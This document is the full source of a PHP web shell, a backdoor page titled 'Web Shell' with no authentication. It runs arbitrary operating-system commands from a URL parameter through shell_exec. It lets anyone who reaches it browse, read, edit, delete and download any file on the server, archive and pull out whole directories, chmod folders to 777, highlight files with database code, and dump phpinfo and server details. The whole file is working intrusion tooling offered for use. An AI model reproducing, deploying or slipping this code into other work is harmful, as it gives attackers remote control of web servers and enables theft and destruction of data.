<?php
function isLinux($path)
{
    return (substr($path,0,1)=="/" ? true : false);
}
function getSlashDir($isLinux)
{
    return($isLinux ? '/' : '\\');
}
//See if we are on Linux or Windows becuase the paths have to be processed differently
$cwd=getcwd();
$isLinux=isLinux($cwd);
if(!$isLinux)
{
    $driveLetter=substr($cwd,0,1);
}
$slash=getSlashDir($isLinux);
$parts=explode($slash,$cwd);
$rootDir=($isLinux ? $slash : ($driveLetter . ':' . $slash));

function cleanPath($path,$isLinux)
{
    $slash=getSlashDir($isLinux);
    $parts=explode($slash,$path);
    foreach($parts as $key=>$val)//Process .. directories and a single .
    {
        if($val=="..")
        {
            $parts[$key]="";
            $lastKey=$key-1;
            $parts[$lastKey]="";
        }
        elseif($val==".")
        {
            $parts[$key]="";
        }
    }
    reset($parts);
    $fixedPath=($isLinux ? "/" : "");//Some PHP configs wont automatically create a variable on .= or will at least whine about it
    $firstPiece=true;
    foreach($parts as $val)//Assemble the path back together
    {
        if($val != "")
        {
            $fixedPath .=  ($firstPiece ? '' : $slash) . $val;
            $firstPiece=false;
        }
    }
    if($fixedPath=="")//If we took out the entire path go to bottom level to avoid an error
    {
        $fixedPath=($isLinux ? $slash : ($driveLetter . ":" . $slash));
    }
    
    //Make sure there is an ending slash
    if(substr($fixedPath,-1)!=$slash)
        $fixedPath .= $slash;
    return $fixedPath;
}
?>

<!DOCTYPE html>
<html>
<head>
	<title>Web Shell</title>
	<style>
		body {
			background-color: #e6f7ff;
			font-family: Arial;
			color: #222;
			margin: 0;
			padding: 0;
			background-image: linear-gradient(to right, #DECBA4, #3E5151);
		}

		.header {
			background-color: #4d4d4d;
			color: #FFF;
			padding: 10px;
			text-align: center;
		}

		.container {
			margin: 0 auto;
			padding: 20px;
			max-width: 800px;
			background-color: #FFF;
			border-radius: 5px;
			box-shadow: 0px 0px 20px 0px rgba(0,0,0,0.5);
		}

		.input-container {
			margin-bottom: 10px;
			display: flex;
		}

		.command-input {
			flex: 1;
			padding: 10px;
			border: none;
			background-color: #f2f2f2;
			color: #333;
			font-size: 16px;
			border-radius: 5px 0 0 5px;
			box-shadow: inset 0px 0px 5px 0px rgba(0,0,0,0.2);
		}

		.submit-button {
			background-color: #4d4d4d;
			color: #FFF;
			padding: 10px;
			border: none;
			font-size: 16px;
			border-radius: 0 5px 5px 0;
			cursor: pointer;
			box-shadow: 0px 0px 5px 0px rgba(0,0,0,0.2);
		}

		.output-container {
			background-color: #f2f2f2;
			padding: 10px;
			border-radius: 5px;
			white-space: pre-wrap;
			font-size: 16px;
			color: #333;
			height: 400px;
			overflow-y: scroll;
			box-shadow: inset 0px 0px 5px 0px rgba(0,0,0,0.2);
		}

		.system-info {
			background-color: #f2f2f2;
			padding: 10px;
			border-radius: 5px;
			font-size: 16px;
			color: #333;
			margin-top: 20px;
			overflow-x: auto;
			white-space: nowrap;
			box-shadow: 0px 0px 5px 0px rgba(0,0,0,0.2);
		}

		.system-info pre {
			font-family: "Courier New", Courier, monospace;
		}

		.system-info a {
			color: #027bd8;
			font-weight: bold;
			background-color: #f2f2f2;
			text-decoration: none;
		}
		.system-info a:hover{
			text-decoration: none;
			color: #b30000;
		}

		@media screen and (max-width: 768px) {
			.container {
				padding: 10px;
			}
			.command-input {
				font-size: 14px;
			}
			.submit-button {
				font-size: 14px;
			}
			.output-container {
				font-size: 14px;
			}
			.system-info {
				font-size: 14px;
			}
}
		
	</style>
</head>
<body>
	<div class="header">
		<h1>Web Shell</h1>
	</div>
	<div class="container">
		<form method="GET">
			<div class="input-container">
				<input type="text" name="cmd" class="command-input" placeholder="Enter command..." autofocus>
				<button type="submit" class="submit-button">Run</button>
			</div>
		</form>
		<div class="output-container">
			<?php
				if(isset($_GET['cmd'])) {
					echo '<pre>';
					$output = shell_exec($_GET['cmd']);
					echo $output;
					echo '</pre>';
				}
				if(isset($_REQUEST['chm']))
				{
					if(!$isLinux)
					{
						echo "This feature only works on Linux";
					}
					else
					{
						echo (@chmod ( $_REQUEST['chm'] , 0777 ) ? "Reassigned" : "Can't Reasign");
					}
				}
				elseif(isset($_REQUEST['phpinfo']))
				{
					phpinfo();
				}
				elseif(isset($_REQUEST['dl']))
				{
					if(@fopen($_REQUEST['dl'] .  $_REQUEST['file'],'r')==true)
					{
						$_REQUEST['dl'] .= $_REQUEST['file'];
						if(substr($_REQUEST['dl'],0,1)==$slash)
							$fileArr=explode($slash,$_REQUEST['dl']);
						
						header('Content-disposition: attachment; filename=' . $_REQUEST['file']);
						header('Content-type: application/octet-stream');
						readfile($_REQUEST['dl']);
					}
					else
					{
						echo $_REQUEST['dl'];
					}
				}
				elseif(isset($_REQUEST["gz"]))
				{
					if(!$isLinux)
					{
						echo "This feature only works on Linux";
					}
					else
					{
						$directory=$_REQUEST["gz"];
						
						if(substr($directory,-1)=="/")
							$directory = substr($directory,0,-1); 
								
						$dirParts=explode($slash,$directory);
						$fname=$dirParts[(sizeof($dirParts)-1)];
						
						$archive = time();
						
						exec( "cd $directory; tar czf $archive *");
						$output=@file_get_contents($directory . "/" . $archive);
						
						if(!$output)
							header("Content-disposition: attachment; filename=ACCESS_PROBLEM");
						else
						{
							header("Content-disposition: attachment; filename=$fname.tgz");
							echo $output;
						}
						
						header('Content-type: application/octet-stream');
						@unlink($directory . "/" . $archive);
					}
				}
				elseif(isset($_REQUEST['f']))
				{
					$filename=$_REQUEST['f'];
					$file=fopen("$filename","rb");
						header("Content-Type: text/plain");
					fpassthru($file);
				}
				elseif(isset($_REQUEST['d']))
				{
					$d=$_REQUEST['d'];
					echo "<pre>";
					if ($handle = opendir("$d")) 
					{
						echo "<h2>listing of ";
						$conString="";
						if($isLinux)
							echo "<a href='?d=$slash'>$slash</a>";
						foreach(explode($slash,cleanPath($d,$isLinux)) as $val)
						{
							$conString .= $val . $slash;
							echo "<a href='?d=$conString'>" . $val . "</a>" . ($val != "" ? $slash : '');
						}
						echo " (<a target='_blank' href='?uploadForm=1&dir=" . urlencode(cleanPath($d,$isLinux)) . "'>upload file</a>) (<a href='?d=" . urlencode(cleanPath($d,$isLinux)) . "&hldb=1'>DB interaction files in red</a>)</h2> (<a target='_blank' href='?gz=" . urlencode(cleanPath($d,$isLinux)) . "'>gzip & download folder</a>) (<a target='_blank' href='?chm=" . urlencode(cleanPath($d,$isLinux)) . "'>chmod folder to 777)</a> (these rarely work)<br />";
						while ($dir = readdir($handle))
						{ 
							if (is_dir("$d$slash$dir")) 
							{
								if($dir != "." && $dir !="..")
									$dirList[]=$dir;
							}
							else
							{
								if(isset($_REQUEST["hldb"]))
								{
									$contents=file_get_contents("$d$slash$dir");
									if (stripos($contents, "mysql_") || stripos($contents, "mysqli_") || stripos($contents, "SELECT "))
									{
										$fileList[]=array('dir'=>$dir,'color'=>'red');
									}
									else
									{
										$fileList[]=array('dir'=>$dir,'color'=>'black');
									}
								}
								else
								{
									$fileList[]=array('dir'=>$dir,'color'=>'black');
								}
							}
						}
						
						echo "<a href='?d=$d$slash.'><font color=grey>.\n</font></a>";
						echo "<a href='?d=$d$slash..'><font color=grey>..\n</font></a>";
						
						//Some configurations throw a notice if is_array is tried with a non-existant variable
						if(isset($dirList))
						if(is_array($dirList))
						foreach($dirList as $dir)
						{
								echo "<a href='?d=$d$slash$dir'><font color=grey>$dir\n</font></a>";
						}
						
						if(isset($fileList))
						if(is_array($fileList))
						foreach($fileList as $dir)
						{
							echo "<a href='?ef=" . cleanPath($d,$isLinux) . '&file=' .$dir["dir"] . "'><font color=" . $dir['color'] . ">" . $dir['dir'] . "</font></a>" . 
								"|<a href='?dl=" . cleanPath($d,$isLinux) . '&file=' .$dir["dir"] . "'>Download</a>|" . 
								"|<a href='?ef=" . cleanPath($d,$isLinux) . '&file=' .$dir["dir"] . "'>Edit</a>|" . 
								"|<a href='?df=" . cleanPath($d,$isLinux) . '&file=' .$dir["dir"] . "'>Delete</a>| \n";
						}
					} 
					else 
					echo "opendir() failed";
					closedir($handle);
				}elseif(isset($_REQUEST['df']))
				{
					$_REQUEST['df'] .= $slash . $_REQUEST['file'];
					if(@unlink($_REQUEST['df']))
					{
							echo "File deleted";
					}
					else
					{
							echo "Error deleting file";
					}
				}
				elseif(isset($_REQUEST['ef']) || isset($_REQUEST['f']))
				{
					$_REQUEST['ef'] .= $_REQUEST['file']; 
					if(isset($_POST["newcontent"]))
					{
						$_POST["newcontent"]=urldecode(base64_decode($_POST["newcontent"]));
						$stream=@fopen($_REQUEST['ef'],"w");
						
						if($stream)
						{
							fwrite($stream,$_POST["newcontent"]);
							echo "Write sucessful";
						}
						else
						{
							echo "Could not write to file";
						}
						fclose($stream);
					}
					echo '<pre>';
					$output = file_get_contents($_REQUEST['ef']);
					echo $output;
					echo '</pre>';
				}
			?>
		</div>
		<div class="system-info">
			<h2>System Information</h2>
			<?php
				echo '<pre>';
				echo 'Operating System: ' . php_uname() . "\n";
				echo 'Hostname: ' . gethostname() . "\n";
				echo 'IP Address: ' . $_SERVER['SERVER_ADDR'] . "\n";
				echo 'PHP Version: ' . phpversion() . "\n";
				echo 'Server Software: ' . $_SERVER['SERVER_SOFTWARE'] . "\n";
				echo 'Document Root: ' . $_SERVER['DOCUMENT_ROOT'] . "\n";
				echo 'Server Name: ' . $_SERVER['SERVER_NAME'] . "\n";
				echo 'Server Admin: ' . $_SERVER['SERVER_ADMIN'] . "\n";
				echo 'Loaded PHP Configuration: ' . php_ini_loaded_file() . "\n";
				echo 'Display Errors: ' . ini_get('display_errors') . "\n";
				echo 'Error Reporting Level: ' . error_reporting() . "\n";
				echo 'PHP-Info : <a href="?phpinfo=true">Open The PHP Info</a>'. "\n";
				echo '</pre>';
			?>
            <h2>Go to any directory:</h2> 
			<!-- <form action="" method="GET">
				<input type="text" name="d" value="<?php echo $rootDir ?>" />
				<input type="submit" value="Go" />
			</form> -->
			<form method="GET">
				<div class="input-container">
					<input type="text" name="d" class="command-input" placeholder="Enter Directory ...">
					<button type="submit" class="submit-button">List Now</button>
				</div>
			</form>
		</div>
	</div>
</body>
</html>